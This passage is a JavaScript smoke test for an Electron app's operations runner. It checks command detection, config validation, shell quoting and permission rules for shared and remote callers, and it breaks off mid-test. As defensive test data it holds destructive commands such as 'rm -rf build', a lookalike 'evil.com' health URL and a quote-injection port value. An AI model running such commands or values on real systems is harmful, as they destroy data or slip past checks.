#!/usr/bin/env node
/**
 * Smoke test for Cockpit operations (package B): detectors, config merge and
 * validation, produces parsing, runs through a fake TabRuntime, the ops C3
 * table, operations.yaml round trip, operation agents and their argv.
 * No Electron, no ports Lee uses, no real Claude.
 *
 *   cd electron && npm run build:main && node scripts/cockpit-ops-smoke.js
 *
 * `electron` is stubbed, and HOME points at a temp dir so nothing under the
 * real ~/.lee is read or written.
 */
'use strict';

const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const net = require('net');
const Module = require('module');
const { execFileSync } = require('child_process');

const tmpHome = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'lee-ops-smoke-')));
process.env.HOME = tmpHome;
delete process.env.IDF_PATH;

const ipcHandlers = new Map();
const sentToWindows = [];
const electronStub = {
  app: { on() {}, getPath: () => tmpHome, isPackaged: false },
  ipcMain: {
    handle(ch, fn) {
      ipcHandlers.set(ch, fn);
    },
    on() {},
  },
  BrowserWindow: { fromWebContents: () => ({ id: 1 }), getAllWindows: () => [], getFocusedWindow: () => ({ id: 1 }) },
};
const origLoad = Module._load;
Module._load = function (request, parent, isMain) {
  if (request === 'electron') return electronStub;
  return origLoad.call(this, request, parent, isMain);
};

const dist = path.join(__dirname, '..', 'dist', 'main');
const req = (p) => require(path.join(dist, p));
const { copilotBus } = req('copilot/bus.js');
const { cockpitBus } = req('cockpit/cockpit-bus.js');
const { invalidateCockpitConfig } = req('cockpit/cockpit-config.js');
const cfg = req('cockpit/ops-config.js');
const detect = req('cockpit/ops-detect.js');
const opsFile = req('cockpit/ops-file.js');
const { parseReadings } = req('cockpit/ops-produces.js');
const rtMod = req('cockpit/ops-runtime.js');
const agentMod = req('cockpit/ops-agent.js');
const opsMain = req('cockpit/ops-main.js');
const { windowRegistry } = req('window-registry.js');
const { COCKPIT_IPC } = require(path.join(dist, '..', 'shared', 'cockpit.js'));
const yaml = require('js-yaml');

const events = [];
copilotBus.on('event', (e) => events.push(e));
const eventsOf = (type) => events.filter((e) => e.type === type);
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function write(file, text) {
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, text);
}

// ---------------------------------------------------------------------------
// Fixtures
// ---------------------------------------------------------------------------

const ws = path.join(tmpHome, 'work', 'proj');
write(path.join(ws, 'package.json'), JSON.stringify({
  scripts: { dev: 'vite', build: 'tsc -p .', postinstall: 'node x.js', prebuild: 'rm -rf out', preview: 'vite preview', deploy: 'firebase deploy', 'test:watch': 'jest --watch' },
}));
write(path.join(ws, 'app', 'package.json'), JSON.stringify({ scripts: { build: 'tsc', start: 'node .' } }));
write(path.join(ws, 'app', 'yarn.lock'), '');
write(path.join(ws, 'Makefile'), 'CC:=gcc\n.PHONY: all\nall: build\n\techo all\n%.o: %.c\n\tcc $<\ninstall:\n\tcp x y\n');
write(path.join(ws, 'py', 'pyproject.toml'), '[project]\nname = "x"\n\n[tool.pytest.ini_options]\naddopts = "-q"\n\n[tool.taskipy.tasks]\nlint = "ruff check ."\nserve = "uvicorn app:app"\ncomplex = { cmd = "x" }\n');
write(path.join(ws, 'fw', 'CMakeLists.txt'), 'cmake_minimum_required(VERSION 3.16)\ninclude($ENV{IDF_PATH}/tools/cmake/project.cmake)\nproject(fw)\n');
write(path.join(ws, 'mobile', 'pubspec.yaml'), 'name: mobile\n');
write(path.join(ws, 'node_modules', 'dep', 'package.json'), JSON.stringify({ scripts: { hidden: 'x' } }));
write(path.join(ws, 'a', 'b', 'c', 'package.json'), JSON.stringify({ scripts: { deep: 'x' } }));
write(path.join(ws, 'build-out', 'package.json'), JSON.stringify({ scripts: { skipped: 'x' } }));
const flutterBin = path.join(tmpHome, 'Development', 'flutter', 'bin', 'flutter');
write(flutterBin, '#!/bin/sh\n');
const idfExport = path.join(tmpHome, 'Development', 'hardware', 'esp-idf', 'export.sh');
write(idfExport, '# idf\n');
const toolEnv = { home: tmpHome, path: '', idfPath: null, toolPaths: [] };

const configYaml = `# my comments stay
operations:
  - name: build
    command: make build-all
  - name: "bad name!"
    command: x
  - name: bench
    command: echo cold_start_ms=1412
    produces: { metric: cold_start_ms, parse: "cold_start_ms=(\\\\d+)", unit: ms }
  - name: badre
    command: echo x
    produces: { metric: m, parse: "no groups" }
  - name: web
    kind: long-running
    command: npm run dev
    ports: [5173]
    health: http://example.com/
    match: ["vite*"]
  - name: failing
    command: "false"
  - name: flash-dev
    command: idf.py -p {port} flash
    cwd: fw
    confirm: true
    allowed_tools: ["Bash(ls /dev/cu.*)"]
  - name: envy
    command: printenv FOO
    env: { FOO: "a b" }
environments:
  local:
    confirm_actions: true
    services:
      - name: API Service
        cwd: api
        detect: port
        ports: [8000]
        health_checks: ["http://127.0.0.1:8000/health"]
        actions:
          - { name: up, command: "docker compose up" }
          - { name: down, command: "docker compose down" }
`;
write(path.join(ws, '.lee', 'config.yaml'), configYaml);
write(path.join(tmpHome, '.lee', 'config.yaml'), 'services:\n  - name: cache\n    detect: docker\n    actions:\n      - { name: up, command: "redis-server" }\n');
write(path.join(ws, '.lee', 'operations.yaml'), `version: 1
operations:
  - name: build
    command: echo shadowed
  - name: lint2
    command: npm run lint
    note: keep me
    detected_from: package.json
dismissed_suggestions: [dev]
custom_top: 1
`);

// ---------------------------------------------------------------------------
// Fakes
// ---------------------------------------------------------------------------

class FakeTabs {
  constructor() {
    this.tabs = new Map();
    this.sends = [];
    this.opened = [];
    this.next = 100;
  }
  add(pty, o = {}) {
    this.tabs.set(pty, {
      kind: o.kind ?? 'shell',
      state: o.state ?? 'idle-at-prompt',
      cwd: o.cwd ?? null,
      integration: o.integration ?? true,
      label: o.label ?? `Terminal ${pty}`,
      workspace: o.workspace ?? ws,
      out: '',
    });
  }
  info(pty) {
    const t = this.tabs.get(pty);
    if (!t) return null;
    return {
      pty_id: pty, tab_id: pty, window_id: 1, workspace: t.workspace, label: t.label, tab_type: 'terminal', kind: t.kind,
      provider: null, fidelity: 'activity', state: this.state(pty), shell_integration: t.integration, cwd: t.cwd,
      last_command: null, operation: null, task_id: null, session_id: null, tail: [],
    };
  }
  list() {
    return [...this.tabs.keys()].map((p) => this.info(p));
  }
  get(pty) {
    return this.info(pty);
  }
  state(pty) {
    const t = this.tabs.get(pty);
    return { pty_id: pty, state: t ? t.state : 'exited', source: 'shell-integration', since: new Date().toISOString(), quiet_ms: 0, foreground: null };
  }
  read(pty, { since = 0 } = {}) {
    const t = this.tabs.get(pty);
    return { pty_id: pty, text: t ? t.out.slice(since) : '', cursor: t ? t.out.length : 0, truncated: false, state: this.state(pty).state };
  }
  cursor(pty) {
    return this.tabs.get(pty)?.out.length ?? 0;
  }
  async send(pty, r, by) {
    const t = this.tabs.get(pty);
    if (!t) return { success: false, error: 'not_found' };
    if (by.kind === 'shared') return { success: false, error: 'forbidden' };
    if (t.state !== 'idle-at-prompt') return { success: false, error: t.state === 'busy' ? 'busy' : 'state_unknown' };
    this.sends.push({ pty, text: r.text, purpose: r.purpose, submit: r.submit, by });
    t.out += `$ ${r.text}\n`;
    t.state = 'busy';
    if (this.endOnSend != null) {
      // The command dies at once (exit 127): its end signal is the next PTY event.
      const code = this.endOnSend;
      setTimeout(() => this.end(pty, code, 'command not found\n'), 0);
    }
    return { success: true, chars: r.text.length };
  }
  async openTab(o) {
    const pty = this.next++;
    this.opened.push(o);
    this.add(pty, { label: o.label, state: 'unknown', workspace: o.workspace });
    setTimeout(() => {
      this.tabs.get(pty).state = 'idle-at-prompt';
    }, 30);
    return { pty_id: pty, tab_id: pty };
  }
  commandText() {
    return null;
  }
  /** Output, then the shell integration's end signal. */
  end(pty, exitCode, output = '', by = 'lee') {
    const t = this.tabs.get(pty);
    t.out += output;
    t.state = 'idle-at-prompt';
    cockpitBus.emitTerminal({ pty_id: pty, workspace: ws, phase: 'end', sig: 'x', argv0: 'x', text: '', cwd: t.cwd, by, exit_code: exitCode, started_at: new Date().toISOString(), duration_ms: 1234 });
  }
  start(pty, text, cwd = ws) {
    this.tabs.get(pty).state = 'busy';
    cockpitBus.emitTerminal({ pty_id: pty, workspace: ws, phase: 'start', sig: 'x', argv0: text.split(' ')[0], text, cwd, by: 'user', exit_code: null, started_at: new Date().toISOString(), duration_ms: null });
  }
}

class FakeLauncher {
  constructor() {
    this.launches = [];
    this.tasks = [];
    this.nextPty = 300;
  }
  async launch(r, by, windowId) {
    this.launches.push({ req: r, by, windowId });
    return { success: true, task_id: `task-${String(this.launches.length).padStart(8, '0')}`, pty_id: this.nextPty++, session_id: `sess-${this.launches.length}`, relayed: false };
  }
  async createTask(input) {
    this.tasks.push(input);
    return { task_id: 'task-feedc0de', relayed: false };
  }
}

/** §5.6 step 4, used only if package A's buildClaudeArgs isn't in this build. */
function referenceClaudeArgs(r, ids) {
  const mode = r.permission_mode ?? (r.lead === 'plan' ? 'plan' : 'acceptEdits');
  const worktree = r.worktree ?? r.lead === 'delegate';
  const title = r.title ?? (r.prompt ? r.prompt.slice(0, 60) : 'Task');
  return [
    '--permission-mode', mode,
    ...(worktree ? ['--worktree', ids.slug] : []),
    '--session-id', ids.session_id,
    '-n', title,
    ...(r.model ? ['--model', r.model] : []),
    ...(r.tools ? ['--tools', r.tools.join(',')] : []),
    ...(r.allowed_tools ? ['--allowedTools', r.allowed_tools.join(',')] : []),
    ...(r.prompt ? ['--', r.prompt] : []),
  ];
}
let buildClaudeArgs = referenceClaudeArgs;
try {
  const launcher = req('cockpit/launcher.js');
  if (typeof launcher.buildClaudeArgs === 'function') buildClaudeArgs = launcher.buildClaudeArgs;
} catch {
  // package A not merged in this worktree
}

const LOCAL = { kind: 'local-user' };
const HESTER = { kind: 'shared', loopback: true, ip: '127.0.0.1' };
const LAN = { kind: 'shared', loopback: false, ip: '192.168.1.9' };
const DEVICE = { kind: 'device', device_id: 'd1', name: 'Dirigible', device_kind: 'dirigible', ip: '192.168.1.20' };

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

const tests = [];
const test = (name, fn) => tests.push([name, fn]);

test('detectors: names, kinds, confirm flags, tool paths, skips', () => {
  const res = detect.detectOperations(ws, toolEnv);
  const by = Object.fromEntries(res.suggestions.map((s) => [s.def.name, s]));
  const names = Object.keys(by);
  for (const n of ['dev', 'build', 'preview', 'deploy', 'test:watch', 'app:build', 'app:start', 'make:all', 'make:install', 'py:pytest', 'py:lint', 'py:serve', 'fw:build', 'fw:flash', 'fw:monitor', 'mobile:analyze', 'mobile:test', 'mobile:run']) {
    assert.ok(names.includes(n), `suggests ${n} (got ${names.join(', ')})`);
  }
  for (const n of ['postinstall', 'prebuild', 'hidden', 'deep', 'skipped', 'make:.PHONY', 'make:CC', 'py:complex']) assert.ok(!names.includes(n), `skips ${n}`);
  assert.ok(!names.some((n) => n.includes('%')), 'no pattern rules');
  assert.strictEqual(by.dev.def.kind, 'long-running');
  assert.strictEqual(by['test:watch'].def.kind, 'long-running', '--watch is long-running');
  assert.strictEqual(by.preview.def.kind, 'oneshot');
  assert.strictEqual(by['app:start'].def.kind, 'long-running');
  assert.strictEqual(by.build.def.kind, 'oneshot');
  assert.strictEqual(by.build.def.command, 'npm run build');
  assert.strictEqual(by['app:build'].def.command, 'yarn build', 'yarn lockfile');
  assert.strictEqual(by['app:build'].def.cwd, 'app');
  assert.strictEqual(by['app:build'].detected_from, 'app/package.json');
  assert.strictEqual(by.deploy.def.confirm, true);
  assert.strictEqual(by['make:install'].def.confirm, true);
  assert.strictEqual(by['make:all'].def.command, 'make all');
  assert.ok(!by['make:all'].def.confirm);
  assert.strictEqual(by['py:pytest'].def.command, 'pytest');
  assert.strictEqual(by['py:lint'].def.command, 'task lint');
  assert.strictEqual(by['py:serve'].def.kind, 'long-running');
  assert.strictEqual(by['fw:build'].def.command, `. ${idfExport} >/dev/null && idf.py build`);
  assert.strictEqual(by['fw:flash'].def.confirm, true);
  assert.deepStrictEqual(by['fw:flash'].def.params, ['port']);
  assert.strictEqual(by['fw:flash'].def.command, `. ${idfExport} >/dev/null && idf.py -p {port} flash`);
  assert.strictEqual(by['fw:monitor'].def.kind, 'long-running');
  assert.strictEqual(by['fw:build'].detected_from, 'fw (idf.py)');
  assert.strictEqual(by['mobile:analyze'].def.command, `${flutterBin} analyze`);
  assert.strictEqual(by['mobile:run'].def.kind, 'long-running');
  assert.strictEqual(by['mobile:test'].detected_from, 'mobile/pubspec.yaml');
  // On PATH: plain names.
  const binDir = path.join(tmpHome, 'bin');
  write(path.join(binDir, 'flutter'), '');
  write(path.join(binDir, 'idf.py'), '');
  assert.strictEqual(detect.resolveFlutter({ ...toolEnv, path: binDir }), 'flutter');
  assert.strictEqual(detect.resolveIdfPrefix({ ...toolEnv, path: binDir }), '');
  // pnpm lockfile at the root.
  write(path.join(ws, 'pnpm-lock.yaml'), '');
  assert.strictEqual(detect.detectPackageJson(ws, '').find((f) => f.def.name === 'build').def.command, 'pnpm run build');
  fs.rmSync(path.join(ws, 'pnpm-lock.yaml'));
});

test('config: merge order, validation, services mapping', () => {
  const c = opsFile.readConfigOperations(ws, tmpHome);
  const f = opsFile.readOperationsFile(ws);
  const merged = cfg.mergeOperations(c.config, f.defs, c.services);
  const by = Object.fromEntries(merged.map((m) => [m.def.name, m]));
  assert.strictEqual(by.build.def.command, 'make build-all', 'config.yaml wins over operations.yaml');
  assert.strictEqual(by.build.source, 'config');
  assert.strictEqual(by.lint2.source, 'operations-file');
  assert.ok(!by['bad name!'], 'invalid name skipped');
  assert.ok(c.warnings.some((w) => w.includes('bad name')));
  assert.ok(by.badre, 'op with a bad produces is kept');
  assert.strictEqual(by.badre.def.produces, undefined, 'bad regex skipped');
  assert.ok(c.warnings.some((w) => w.includes('badre')));
  assert.strictEqual(by.bench.def.produces[0].metric, 'cold_start_ms');
  assert.strictEqual(by.web.def.health, undefined, 'non-local health ignored');
  assert.strictEqual(by.web.def.kind, 'long-running');
  assert.deepStrictEqual(by['flash-dev'].def.params, ['port'], 'params inferred from placeholders');
  assert.strictEqual(by['service:API-Service'].source, 'service');
  assert.strictEqual(by['service:API-Service'].runnable, false);
  assert.strictEqual(by['service:API-Service'].def.health, 'http://127.0.0.1:8000/health');
  assert.deepStrictEqual(by['service:API-Service'].def.ports, [8000]);
  assert.strictEqual(by['API-Service/up'].def.confirm, true, 'confirm_actions');
  assert.strictEqual(by['API-Service/up'].def.cwd, 'api');
  assert.ok(by['service:cache'], 'machine-wide services too');
  assert.strictEqual(by['service:cache'].service.detect, 'docker');
  assert.ok(!by['cache/up'].def.confirm);
  // Health and name rules.
  assert.ok(cfg.isLocalHealthUrl('http://localhost:5173/'));
  assert.ok(!cfg.isLocalHealthUrl('http://127.0.0.1.evil.com/'));
  const w = [];
  assert.strictEqual(cfg.validateOperation({ name: 'x', command: 'a\nb' }, w), null, 'multi-line command rejected');
});

test('command helpers: params, matching, argv0', () => {
  assert.deepStrictEqual(cfg.substituteParams('idf.py -p {port} flash', ['port'], {}), { line: 'idf.py -p {port} flash', missing: ['port'], invalid: [] });
  assert.strictEqual(cfg.substituteParams('idf.py -p {port} flash', ['port'], { port: "/dev/cu.x'y" }).line, `idf.py -p '/dev/cu.x'\\''y' flash`);
  const def = { name: 'f', kind: 'oneshot', command: 'idf.py -p {port} flash', match: ['vite*'] };
  assert.ok(cfg.commandMatchesOperation(def, 'idf.py  -p /dev/cu.usb   flash'));
  assert.ok(cfg.commandMatchesOperation(def, 'vite --port 3'));
  assert.ok(!cfg.commandMatchesOperation(def, 'idf.py build'));
  assert.ok(cfg.commandMatchesOperation({ name: 'b', kind: 'oneshot', command: 'npm run build' }, 'npm run build'));
  assert.ok(!cfg.commandMatchesOperation({ name: 'b', kind: 'oneshot', command: 'npm run build' }, 'npm run build:main'));
  assert.strictEqual(cfg.commandArgv0('FOO=1 sudo env time npm run x'), 'npm');
  assert.strictEqual(
    rtMod.buildRunLine({ command: 'make', cwd: '/w/a b', tabCwd: null, env: { K: "v'" }, shellIntegration: false }),
    `cd '/w/a b' && (export K='v'\\'''; make); printf '\\033]133;D;%s\\007' "$?"`,
  );
  assert.strictEqual(rtMod.buildRunLine({ command: 'make', cwd: '/w', tabCwd: '/w/', shellIntegration: true }), 'make');
});

test('produces: last match, numbers only', () => {
  const p = [{ metric: 'cold_start_ms', parse: 'cold_start_ms=(\\d+)', unit: 'ms' }, { metric: 'n', parse: 'n=(\\w+)' }, { metric: 'none', parse: 'zzz(\\d)' }];
  const r = parseReadings('cold_start_ms=1590\nn=abc\ncold_start_ms=1412\n', p);
  assert.deepStrictEqual(r, [{ metric: 'cold_start_ms', value: 1412, unit: 'ms' }]);
});

test('inputs_sig: git repo vs not', async () => {
  const repo = path.join(tmpHome, 'repo');
  fs.mkdirSync(repo);
  const git = (...a) => execFileSync('git', a, { cwd: repo, env: { ...process.env, GIT_CONFIG_GLOBAL: '/dev/null', GIT_AUTHOR_NAME: 'x', GIT_AUTHOR_EMAIL: 'x@x', GIT_COMMITTER_NAME: 'x', GIT_COMMITTER_EMAIL: 'x@x' } });
  git('init', '-q');
  write(path.join(repo, 'a.txt'), '1');
  git('add', 'a.txt');
  git('commit', '-qm', 'x');
  const a = await rtMod.gitInputsSig(repo);
  assert.match(a, /^[0-9a-f]{12}$/);
  write(path.join(repo, 'a.txt'), '2');
  const b = await rtMod.gitInputsSig(repo);
  assert.notStrictEqual(a, b, 'dirty tree changes the signature');
  assert.strictEqual(await rtMod.gitInputsSig(tmpHome), null);
});

// ---- Integration through ops-main (IPC, bus, command domain, Feed) ----------

const tabs = new FakeTabs();
const launcher = new FakeLauncher();
const ptyWrites = [];
const fakePty = {
  listeners: {},
  log() {},
  write(id, d) {
    ptyWrites.push([id, d]);
  },
  on(ev, fn) {
    this.listeners[ev] = fn;
  },
  off() {},
};
const routes = {};
let ipc;
let domain;

async function waitFor(fn, ms = 3000) {
  const end = Date.now() + ms;
  while (Date.now() < end) {
    const v = fn();
    if (v) return v;
    await sleep(20);
  }
  throw new Error('timed out waiting');
}

test('init: provider, domain, IPC, route registered', () => {
  const bw = { id: 1, isDestroyed: () => false, isMinimized: () => false, restore() {}, show() {}, focus() {}, webContents: { send: (ch, p) => sentToWindows.push([ch, p]) } };
  windowRegistry.register(bw, ws, { getContext: () => ({ workspace: ws, tabs: [], panels: {}, focusedPanel: 'center' }) });
  invalidateCockpitConfig();
  cockpitBus.setTabRuntime(tabs);
  cockpitBus.setLauncher(launcher);
  opsMain.initCockpitOps({ ptyManager: fakePty });
  cockpitBus.setExpressApp({ get: (p, fn) => (routes[p] = fn) });
  assert.ok(cockpitBus.ops, 'setOps');
  domain = cockpitBus.getCommandDomain('ops');
  assert.ok(domain, 'ops domain');
  for (const k of ['opsList', 'opsRun', 'opsStop', 'opsConfirm', 'opsDismissSuggestion', 'opsSave', 'opsLinkTab', 'opsAgent', 'opsSerialPorts']) {
    assert.ok(ipcHandlers.has(COCKPIT_IPC[k]), `IPC ${k}`);
  }
  ipc = (k, ...args) => ipcHandlers.get(COCKPIT_IPC[k])({ sender: {} }, ...args);
  assert.ok(routes['/cockpit/ops'], 'GET /cockpit/ops');
  assert.ok(Array.isArray(ipcHandlers.get(COCKPIT_IPC.opsSerialPorts)()));
});

test('snapshot: operations, suggestions minus defined/dismissed, events', () => {
  const snap = cockpitBus.ops.snapshot(ws);
  const names = snap.operations.map((o) => o.def.name);
  assert.ok(names.includes('bench') && names.includes('lint2') && names.includes('service:API-Service'));
  const sugs = snap.suggestions.map((s) => s.def.name);
  assert.ok(!sugs.includes('build'), 'defined names are not suggested');
  assert.ok(!sugs.includes('dev'), 'dismissed');
  assert.ok(sugs.includes('app:build'));
  assert.strictEqual(snap.agent.model, 'claude-haiku-4-5-20251001');
  assert.strictEqual(snap.operations.find((o) => o.def.name === 'bench').status, 'idle');
  assert.strictEqual(eventsOf('operation.suggested').length, 1);
  cockpitBus.ops.snapshot(ws);
  assert.strictEqual(eventsOf('operation.suggested').length, 1, 'logged once per new set');
});

test('HTTP GET /cockpit/ops: shared LAN 403, loopback ok', () => {
  const call = (principal, workspace) => {
    const out = {};
    const res = { locals: { principal }, status(c) { out.status = c; return this; }, json(b) { out.body = b; out.status = out.status ?? 200; } };
    routes['/cockpit/ops']({ query: { workspace } }, res);
    return out;
  };
  assert.strictEqual(call(LAN, ws).status, 403);
  assert.strictEqual(call(HESTER, ws).body.workspace, ws);
  assert.strictEqual(call(DEVICE, '/elsewhere').status, 400);
});

test('run: new tab, exact line, passed with readings, log saved', async () => {
  const before = events.length;
  const res = await ipc('opsRun', { workspace: ws, name: 'bench' });
  assert.ok(res.success, JSON.stringify(res));
  const pty = res.run.pty_id;
  assert.strictEqual(tabs.opened[0].label, '▶ bench');
  assert.strictEqual(tabs.opened[0].activate, false);
  const send = tabs.sends.at(-1);
  assert.strictEqual(send.text, `cd '${ws}' && echo cold_start_ms=1412`);
  assert.strictEqual(send.purpose, 'operation');
  assert.strictEqual(send.submit, true);
  assert.strictEqual(cockpitBus.ops.snapshot(ws).operations.find((o) => o.def.name === 'bench').status, 'running');
  tabs.end(pty, 0, 'cold_start_ms=1590\ncold_start_ms=1412\n');
  const info = cockpitBus.ops.snapshot(ws).operations.find((o) => o.def.name === 'bench');
  assert.strictEqual(info.status, 'passed');
  assert.deepStrictEqual(info.last_run.readings, [{ metric: 'cold_start_ms', value: 1412, unit: 'ms' }]);
  assert.strictEqual(info.linked_pty_id, pty);
  const runEv = events.slice(before).find((e) => e.type === 'operation.run');
  assert.strictEqual(runEv.data.op, 'bench');
  assert.strictEqual(runEv.data.reused_tab, false);
  assert.strictEqual(runEv.data.by, 'user');
  assert.ok(!JSON.stringify(runEv).includes('echo'), 'no command text in operation.run');
  const resEv = events.slice(before).find((e) => e.type === 'operation.result');
  assert.strictEqual(resEv.data.status, 'passed');
  assert.strictEqual(resEv.data.duration_ms, 1234);
  assert.deepStrictEqual(resEv.data.readings, [{ metric: 'cold_start_ms', value: 1412, unit: 'ms' }]);
  const logFile = path.join(tmpHome, '.lee', 'ops', rtMod.wsidFor(ws), 'bench.last.log');
  assert.ok(fs.readFileSync(logFile, 'utf8').includes('cold_start_ms=1412'));
  assert.strictEqual(fs.statSync(logFile).mode & 0o777, 0o600);
  const metric = cockpitBus.feed.list(ws).find((e) => e.kind === 'metric');
  assert.strictEqual(metric.title, 'cold_start_ms 1412');
  // Second run reuses the linked, idle tab; the previous reading shows as "last".
  const res2 = await ipc('opsRun', { workspace: ws, name: 'bench' });
  assert.strictEqual(res2.run.pty_id, pty);
  assert.strictEqual(tabs.opened.length, 1);
  tabs.end(pty, 0, 'cold_start_ms=1500\n');
  assert.ok(cockpitBus.feed.list(ws).some((e) => e.kind === 'metric' && e.title === 'cold_start_ms 1500 (last 1412)'));
  assert.strictEqual(eventsOf('operation.run').at(-1).data.reused_tab, true);
  // A state file with the runs.
  await sleep(600);
  const state = JSON.parse(fs.readFileSync(path.join(tmpHome, '.lee', 'ops', rtMod.wsidFor(ws), 'state.json'), 'utf8'));
  assert.strictEqual(state.runs.bench.length, 2);
});

test('run: failed -> failure Feed entry; stopped; missing exit -> unknown', async () => {
  const r1 = await ipc('opsRun', { workspace: ws, name: 'failing' });
  tabs.end(r1.run.pty_id, 2, 'boom\n');
  let info = cockpitBus.ops.snapshot(ws).operations.find((o) => o.def.name === 'failing');
  assert.strictEqual(info.status, 'failed');
  const fail = cockpitBus.feed.list(ws).find((e) => e.kind === 'failure' && e.ref.op === 'failing');
  assert.ok(fail, 'failure entry');
  assert.strictEqual(fail.severity, 'needs-you');
  assert.deepStrictEqual(fail.actions.map((a) => a.id).sort(), ['create-task', 'fix-with-agent', 'open-tab']);
  const r2 = await ipc('opsRun', { workspace: ws, name: 'failing' });
  tabs.end(r2.run.pty_id, 130);
  info = cockpitBus.ops.snapshot(ws).operations.find((o) => o.def.name === 'failing');
  assert.strictEqual(info.status, 'stopped');
  const r3 = await ipc('opsRun', { workspace: ws, name: 'failing' });
  tabs.end(r3.run.pty_id, null);
  info = cockpitBus.ops.snapshot(ws).operations.find((o) => o.def.name === 'failing');
  assert.strictEqual(info.status, 'unknown');
  assert.strictEqual(info.last_run.exit_code, null);
});

test('run: no shell integration appends the 133;D printf; env subshell; busy tab refused', async () => {
  tabs.add(50, { integration: false, cwd: ws });
  const res = await ipc('opsRun', { workspace: ws, name: 'envy', pty_id: 50 });
  assert.ok(res.success, JSON.stringify(res));
  assert.strictEqual(tabs.sends.at(-1).text, `(export FOO='a b'; printenv FOO); printf '\\033]133;D;%s\\007' "$?"`);
  const busy = await ipc('opsRun', { workspace: ws, name: 'bench', pty_id: 50 });
  assert.strictEqual(busy.success, false);
  assert.strictEqual(busy.error, 'busy');
  tabs.end(50, 0);
  tabs.add(51, { kind: 'agent' });
  assert.strictEqual((await ipc('opsRun', { workspace: ws, name: 'bench', pty_id: 51 })).error, 'not_shell');
  assert.strictEqual((await ipc('opsRun', { workspace: ws, name: 'service:API-Service' })).error, 'not_runnable');
  const miss = await ipc('opsRun', { workspace: ws, name: 'flash-dev', confirmed: true });
  assert.deepStrictEqual(miss.missing_params, ['port']);
});

test('C3 table: local, device, Hester, LAN', async () => {
  const sends = () => tabs.sends.length;
  // Local user: confirm op needs confirmed; then logs ceremony operation-confirm.
  let n = sends();
  let r = await ipc('opsRun', { workspace: ws, name: 'flash-dev', params: { port: '/dev/cu.usb1' } });
  assert.strictEqual(r.needs_confirm, true);
  assert.strictEqual(sends(), n);
  r = await ipc('opsRun', { workspace: ws, name: 'flash-dev', params: { port: '/dev/cu.usb1' }, confirmed: true });
  assert.ok(r.success);
  assert.ok(tabs.sends.at(-1).text.endsWith(`idf.py -p '/dev/cu.usb1' flash`));
  assert.ok(eventsOf('ui.ceremony').some((e) => e.data.target === 'operation-confirm'));
  tabs.end(r.run.pty_id, 0);
  // Local ad-hoc needs the UI's confirm.
  r = await ipc('opsRun', { workspace: ws, command: 'ls -la' });
  assert.strictEqual(r.needs_confirm, true);
  r = await ipc('opsRun', { workspace: ws, command: 'ls -la', confirmed: true });
  assert.ok(r.success);
  assert.strictEqual(r.run.op, 'adhoc:ls');
  tabs.end(r.run.pty_id, 0);
  // Hester: defined op without confirm runs, typed by Lee, with a Feed event.
  n = sends();
  let out = await domain('run', { workspace: ws, name: 'bench' }, HESTER);
  assert.strictEqual(out.status, 200, JSON.stringify(out));
  assert.strictEqual(sends(), n + 1);
  assert.notStrictEqual(tabs.sends.at(-1).by.kind, 'shared', 'Lee types, not the shared token');
  assert.strictEqual(eventsOf('operation.run').at(-1).data.by, 'hester');
  assert.deepStrictEqual(eventsOf('operation.run').at(-1).actor, { kind: 'hester' });
  assert.ok(cockpitBus.feed.list(ws).some((e) => e.title.startsWith('Hester ran bench') && e.text.includes('echo cold_start_ms')));
  tabs.end(out.body.run.pty_id, 0);
  // Hester + confirm: true -> proposal, nothing typed.
  n = sends();
  out = await domain('run', { workspace: ws, name: 'flash-dev', params: { port: '/dev/cu.usb1' } }, HESTER);
  assert.strictEqual(out.status, 202);
  assert.ok(out.body.proposal_id);
  assert.strictEqual(out.body.proposed, true);
  assert.strictEqual(sends(), n);
  const propEntry = cockpitBus.feed.list(ws).find((e) => e.ref.proposal_id === out.body.proposal_id);
  assert.ok(propEntry.actions[0].confirm_text.endsWith(`idf.py -p '/dev/cu.usb1' flash`));
  assert.ok(cockpitBus.ops.snapshot(ws).proposals.some((p) => p.id === out.body.proposal_id));
  assert.strictEqual(eventsOf('operation.proposal').at(-1).data.adhoc, false);
  // Hester can't approve its own proposal.
  assert.strictEqual((await cockpitBus.actOnFeed(propEntry.id, 'approve', {}, HESTER)).error, 'forbidden');
  const approved = await cockpitBus.actOnFeed(propEntry.id, 'approve', {}, LOCAL);
  assert.ok(approved.success, JSON.stringify(approved));
  assert.strictEqual(sends(), n + 1);
  assert.strictEqual(eventsOf('operation.proposal_resolved').at(-1).data.approved, true);
  assert.ok(eventsOf('ui.ceremony').some((e) => e.data.target === 'proposal'));
  assert.strictEqual(eventsOf('operation.run').at(-1).data.by, 'user');
  tabs.end(approved.data.run.pty_id, 0);
  // Hester ad-hoc -> proposal; reject.
  out = await domain('run', { workspace: ws, command: 'rm -rf build' }, HESTER);
  assert.strictEqual(out.status, 202);
  assert.ok(!JSON.stringify(eventsOf('operation.proposal').at(-1)).includes('rm -rf'), 'no command text in the event');
  const adhocEntry = cockpitBus.feed.list(ws).find((e) => e.ref.proposal_id === out.body.proposal_id);
  assert.strictEqual((await cockpitBus.actOnFeed(adhocEntry.id, 'reject', {}, LOCAL)).success, true);
  assert.strictEqual(eventsOf('operation.proposal_resolved').at(-1).data.approved, false);
  // propose action.
  out = await domain('propose', { workspace: ws, command: 'make clean', reason: 'stale build' }, HESTER);
  assert.strictEqual(out.status, 202);
  // Device: ad-hoc -> proposal; confirm op needs confirmed.
  out = await domain('run', { workspace: ws, command: 'ls' }, DEVICE);
  assert.strictEqual(out.status, 202);
  out = await domain('run', { workspace: ws, name: 'flash-dev', params: { port: 'p' } }, DEVICE);
  assert.strictEqual(out.status, 409);
  // agent: 403 for everyone over /command.
  for (const p of [HESTER, DEVICE, LAN]) assert.strictEqual((await domain('agent', { workspace: ws }, p)).status, 403);
  // LAN shared: 403 for everything.
  for (const a of ['list', 'status', 'result', 'run', 'stop']) assert.strictEqual((await domain(a, { workspace: ws, name: 'bench' }, LAN)).status, 403);
  // list/status/result for Hester.
  assert.strictEqual((await domain('list', { workspace: ws }, HESTER)).body.data.workspace, ws);
  assert.strictEqual((await domain('status', { workspace: ws, name: 'bench' }, HESTER)).body.data.def.name, 'bench');
  const runId = cockpitBus.ops.snapshot(ws).operations.find((o) => o.def.name === 'bench').last_run.run_id;
  const res = await domain('result', { run_id: runId }, HESTER);
